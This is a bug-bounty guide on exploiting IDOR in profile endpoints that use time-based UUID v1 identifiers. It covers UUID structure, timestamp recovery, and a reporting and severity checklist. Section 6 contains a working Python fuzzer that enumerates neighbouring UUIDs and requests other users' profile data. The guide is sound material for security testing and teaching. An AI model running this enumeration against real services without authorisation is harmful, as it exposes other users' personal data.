@@ -1,0 +1,359 @@
+
+================================================================================
+         TESTING IDOR IN PROFILE SETTINGS — UUID v1 ANALYSIS & ATTACK GUIDE
+================================================================================
+  Target Context : Profile settings endpoint using UUID v1 as resource identifier
+  UUID Sample    : e575f97a-da9f-11f0-8d44-9d6392d8cc43
+  UUID Version   : 1 (Time-based)
+================================================================================
+
+
+━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+ SECTION 1 — WHAT IS A UUID?
+━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+
+  UUID stands for Universally Unique Identifier.
+  It is a 128-bit value represented as 32 hex characters split into 5 groups
+  by hyphens. Defined in RFC 4122.
+
+  There are 5 versions:
+
+    Version 1  -->  Time-based         (uses timestamp + MAC address)  [OUR CASE]
+    Version 2  -->  DCE Security
+    Version 3  -->  Name-based MD5
+    Version 4  -->  Random             (most secure for user IDs)
+    Version 5  -->  Name-based SHA-1
+
+  Version 1 is the most dangerous for use as a public-facing identifier
+  because it is PARTIALLY PREDICTABLE and LEAKS server information.
+
+
+━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+ SECTION 2 — UUID STRUCTURE (ASCII MAP)
+━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+
+  Full UUID:
+  ┌────────────────────────────────────────────────┐
+  │  e575f97a - da9f - 11f0 - 8d44 - 9d6392d8cc43 │
+  └────────────────────────────────────────────────┘
+
+  Broken down:
+
+  e575f97a  -  da9f  -  11f0  -  8d44  -  9d6392d8cc43
+  ────────     ────     ────     ────     ────────────
+     │           │        │        │            │
+     │           │        │        │            └──► [5] NODE
+     │           │        │        │                 MAC Address of server
+     │           │        │        │                 48 bits / 12 hex chars
+     │           │        │        │
+     │           │        │        └───────────► [4] CLOCK SEQ + VARIANT
+     │           │        │                      16 bits / 4 hex chars
+     │           │        │
+     │           │        └────────────────────► [3] TIME HIGH + VERSION
+     │           │                               First nibble = version (1)
+     │           │                               Remaining 12 bits = time_high
+     │           │
+     │           └─────────────────────────────► [2] TIME MID
+     │                                           16 bits of timestamp
+     │
+     └─────────────────────────────────────────► [1] TIME LOW
+                                                 32 bits of timestamp
+
+
+  128-bit layout (visual bit map):
+  ┌──────────────────────────────────────────────────────────────────────┐
+  │ Bit:  0              31|32      47|48  51|52    63|64    79|80     127│
+  │       ─────────────────┼─────────┼─────┼────────┼────────┼──────────│
+  │       [  time_low     ]│[time_mid]│[ver]│[t_high]│[clk_sq]│  [node] │
+  │       [  e575f97a     ]│[ da9f   ]│[ 1 ]│[ 1f0  ]│[ 8d44 ]│[9d6392 │
+  │                        │         │     │        │        │  d8cc43]│
+  └──────────────────────────────────────────────────────────────────────┘
+
+
+━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+ SECTION 3 — PART-BY-PART ANALYSIS
+━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+
+  ┌─────────────────────────────────────────────────────────────────────┐
+  │  PART 1 — e575f97a   (TIME LOW)                                     │
+  ├─────────────────────────────────────────────────────────────────────┤
+  │  32 bits — lowest portion of the 60-bit UUID timestamp              │
+  │  The UUID timestamp counts 100-nanosecond intervals since           │
+  │  October 15, 1582 (the UUID epoch, not Unix epoch).                 │
+  │                                                                     │
+  │  This combined with time_mid and time_high gives the EXACT          │
+  │  datetime the UUID was created.                                     │
+  │                                                                     │
+  │  Bug hunting value:                                                 │
+  │    >> Recover exact generation time of any resource                 │
+  │    >> UUIDs close in time = close numeric values = enumerable       │
+  └─────────────────────────────────────────────────────────────────────┘
+
+  ┌─────────────────────────────────────────────────────────────────────┐
+  │  PART 2 — da9f   (TIME MID)                                         │
+  ├─────────────────────────────────────────────────────────────────────┤
+  │  16 bits — middle portion of the timestamp                          │
+  │  Combined with time_low and time_high to reconstruct full time.     │
+  └─────────────────────────────────────────────────────────────────────┘
+
+  ┌─────────────────────────────────────────────────────────────────────┐
+  │  PART 3 — 11f0   (VERSION + TIME HIGH)                              │
+  ├─────────────────────────────────────────────────────────────────────┤
+  │  First nibble : 1  -->  UUID VERSION 1  (time-based)                │
+  │  Remaining    : 1f0  -->  highest 12 bits of timestamp              │
+  │                                                                     │
+  │   1    1    f    0                                                  │
+  │  [ver][─────────────── time_high ───────────────]                  │
+  │                                                                     │
+  │  Bug hunting value:                                                 │
+  │    >> Version = 1 means the UUID is time-based = predictable        │
+  │    >> This alone is worth noting in the report                      │
+  └─────────────────────────────────────────────────────────────────────┘
+
+  ┌─────────────────────────────────────────────────────────────────────┐
+  │  PART 4 — 8d44   (VARIANT + CLOCK SEQUENCE)                         │
+  ├─────────────────────────────────────────────────────────────────────┤
+  │  First nibble : 8  -->  binary 1000  -->  variant bits = 10xx       │
+  │                         This confirms RFC 4122 compliant UUID       │
+  │  Remaining    : d44  -->  clock sequence                            │
+  │                           Incremented when clock resets to avoid    │
+  │                           duplicate UUIDs on same machine           │
+  │                                                                     │
+  │   8       d   4   4                                                 │
+  │  [1 0][──────────────── clock_sequence ──────────────────]         │
+  │  variant                                                            │
+  └─────────────────────────────────────────────────────────────────────┘
+
+  ┌─────────────────────────────────────────────────────────────────────┐
+  │  PART 5 — 9d6392d8cc43   (NODE / MAC ADDRESS)                       │
+  ├─────────────────────────────────────────────────────────────────────┤
+  │  48 bits — MAC address of the machine that generated the UUID       │
+  │                                                                     │
+  │  Formatted:  9d:63:92:d8:cc:43                                      │
+  │                                                                     │
+  │  This could be:                                                     │
+  │    - Physical NIC MAC of the backend server                         │
+  │    - Virtual NIC MAC of a container/VM                              │
+  │    - Randomly generated (if server uses privacy extensions)         │
+  │                                                                     │
+  │  Bug hunting value:                                                 │
+  │    >> Server fingerprinting                                         │
+  │    >> Infrastructure recon (identify backend host)                  │
+  │    >> Confirm if multiple UUIDs come from same machine              │
+  │       (same node = same server generated them)                      │
+  └─────────────────────────────────────────────────────────────────────┘
+
+
+━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+ SECTION 4 — TIMESTAMP RECOVERY
+━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+
+  UUID v1 timestamp reconstruction:
+
+                  60-bit timestamp value
+  ┌───────────────────────────────────────────────────┐
+  │  time_high(12) | time_mid(16) | time_low(32)      │
+  │     1f0        |    da9f      |   e575f97a         │
+  └───────────────────────────────────────────────────┘
+                          │
+                          ▼
+         Subtract UUID epoch offset (0x01b21dd213814000)
+                          │
+                          ▼
+              Unix timestamp in 100-ns units
+                          │
+                          ▼
+                Divide by 10,000,000
+                          │
+                          ▼
+                  Human-readable UTC datetime
+
+
+  Python code to recover it:
+
+    import uuid
+    from datetime import datetime, timezone
+
+    u = uuid.UUID("e575f97a-da9f-11f0-8d44-9d6392d8cc43")
+    UUID_EPOCH_OFFSET = 0x01b21dd213814000
+    unix_ts = (u.time - UUID_EPOCH_OFFSET) / 1e7
+    dt = datetime.fromtimestamp(unix_ts, tz=timezone.utc)
+    print(dt)
+
+
+━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+ SECTION 5 — WHY UUID v1 IS VULNERABLE TO IDOR
+━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+
+  UUID v4 (random) vs UUID v1 (time-based):
+
+  v4:  Random 122 bits
+       f47ac10b-58cc-4372-a567-0e02b2c3d479   <-- totally unpredictable
+       a9b8c7d6-e5f4-4321-b210-fedcba987654   <-- no relation to previous
+       11223344-5566-4778-8990-aabbccddeeff   <-- cannot enumerate
+
+  v1:  Time-based 60-bit timestamp + fixed node
+       e575f97a-da9f-11f0-8d44-9d6392d8cc43   <-- user A registered at T
+       e575f97b-da9f-11f0-8d44-9d6392d8cc43   <-- user B registered at T+100ns
+       e575f97c-da9f-11f0-8d44-9d6392d8cc43   <-- user C registered at T+200ns
+            ▲
+            └── only this part changes, and it changes SEQUENTIALLY
+
+  Attack flow:
+  ┌──────────────────────────────────────────────────────────────────┐
+  │  1. Create your own account  →  get your UUID                    │
+  │  2. Extract your UUID from profile settings URL / API response   │
+  │  3. Recover your generation timestamp                            │
+  │  4. Generate UUIDs ±N intervals around your timestamp            │
+  │  5. Fire them at:                                                │
+  │       GET /api/profile/{uuid}                                    │
+  │       GET /api/settings/{uuid}                                   │
+  │       GET /api/user/{uuid}/data                                  │
+  │  6. Check if you get back other users' profile data              │
+  └──────────────────────────────────────────────────────────────────┘
+
+
+━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+ SECTION 6 — PYTHON FUZZER
+━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+
+  import uuid
+  import requests
+
+  def generate_nearby_uuids(target_uuid_str, delta_range=50, step=100):
+      """
+      Generate UUIDs near the target by shifting the timestamp.
+      delta_range : how many steps forward/backward
+      step        : 100-nanosecond units to shift per iteration
+      """
+      target = uuid.UUID(target_uuid_str)
+      nearby = []
+
+      for delta in range(-delta_range, delta_range + 1):
+          new_time = target.time + (delta * step)
+          if new_time < 0:
+              continue
+          new_uuid = uuid.UUID(
+              fields=(
+                  new_time & 0xFFFFFFFF,
+                  (new_time >> 32) & 0xFFFF,
+                  (new_time >> 48) & 0x0FFF | 0x1000,
+                  target.clock_seq_hi_variant,
+                  target.clock_seq_low,
+                  target.node
+              ),
+              version=1
+          )
+          nearby.append(str(new_uuid))
+
+      return nearby
+
+
+  def test_idor(base_url, target_uuid, token):
+      """
+      Fire nearby UUIDs at the target endpoint and log interesting responses.
+      """
+      uuids = generate_nearby_uuids(target_uuid)
+      headers = {"Authorization": f"Bearer {token}"}
+
+      print(f"[*] Testing {len(uuids)} UUIDs against {base_url}\n")
+
+      for u in uuids:
+          url = f"{base_url}/{u}"
+          resp = requests.get(url, headers=headers)
+
+          marker = ""
+          if resp.status_code == 200:
+              marker = "  <== HIT"
+          elif resp.status_code == 403:
+              marker = "  <== FORBIDDEN (exists but blocked)"
+
+          print(f"  [{resp.status_code}] {url}{marker}")
+
+
+  # --- Run it ---
+  test_idor(
+      base_url="https://target.com/api/profile",
+      target_uuid="e575f97a-da9f-11f0-8d44-9d6392d8cc43",
+      token="YOUR_SESSION_TOKEN_HERE"
+  )
+
+
+━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+ SECTION 7 — WHAT TO LOOK FOR IN RESPONSES
+━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+
+  Response code map:
+
+  ┌──────────┬───────────────────────────────────────────────────────┐
+  │  Code    │  Meaning                                              │
+  ├──────────┼───────────────────────────────────────────────────────┤
+  │  200     │  IDOR confirmed — you accessed another user's data    │
+  │  401     │  Unauthenticated — add/fix your token                 │
+  │  403     │  Resource exists but access denied (still a signal)   │
+  │  404     │  UUID not found — no account at that timestamp        │
+  │  302     │  Redirect — may redirect to login or another profile  │
+  │  500     │  Server error — might be processing edge case UUID    │
+  └──────────┴───────────────────────────────────────────────────────┘
+
+  Response body signals:
+    >> Different "user_id", "email", "username" than yours  =  IDOR confirmed
+    >> Same data as yours but different UUID accepted       =  check normalization
+    >> Empty body with 200                                  =  partial IDOR
+    >> Error message leaking field names                    =  useful recon
+
+
+━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+ SECTION 8 — REPORTING CHECKLIST
+━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+
+  [ ]  UUID version confirmed as v1 (time-based)
+  [ ]  Timestamp recovered and noted in report
+  [ ]  MAC address extracted: 9d:63:92:d8:cc:43
+  [ ]  Nearby UUIDs generated successfully
+  [ ]  At least one neighboring UUID returned 200 with different user data
+  [ ]  Endpoint confirmed: GET /api/profile/{uuid} or similar
+  [ ]  Auth bypass checked (does endpoint work without token?)
+  [ ]  IDOR via POST/PUT/DELETE also tested (not just GET)
+  [ ]  Impact described: PII access, account takeover potential, data leak
+
+
+━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+ SECTION 9 — SEVERITY ASSESSMENT
+━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+
+  Using CVSS v3 framing:
+
+  ┌─────────────────────┬──────────────────────────────────────────┐
+  │  Factor             │  Value                                   │
+  ├─────────────────────┼──────────────────────────────────────────┤
+  │  Attack Vector      │  Network                                 │
+  │  Attack Complexity  │  Low (UUIDs are predictable)             │
+  │  Privileges Req.    │  Low (need own account to get 1 UUID)    │
+  │  User Interaction   │  None                                    │
+  │  Scope              │  Unchanged                               │
+  │  Confidentiality    │  High (full profile data of other users) │
+  │  Integrity          │  High (if PUT/PATCH also vulnerable)     │
+  │  Availability       │  None                                    │
+  └─────────────────────┴──────────────────────────────────────────┘
+
+  Estimated severity on HackerOne:
+    Read-only profile data leak     -->  Medium to High
+    PII exposed (email, phone)      -->  High
+    Full account data + writable    -->  Critical
+
+
+━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+ REFERENCES
+━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+
+  RFC 4122   — A Universally Unique IDentifier (UUID) URN Namespace
+               https://www.rfc-editor.org/rfc/rfc4122
+
+  CWE-284    — Improper Access Control
+  CWE-330    — Use of Insufficiently Random Values
+  CWE-200    — Exposure of Sensitive Information
+
+================================================================================
+  END OF DOCUMENT
+================================================================================
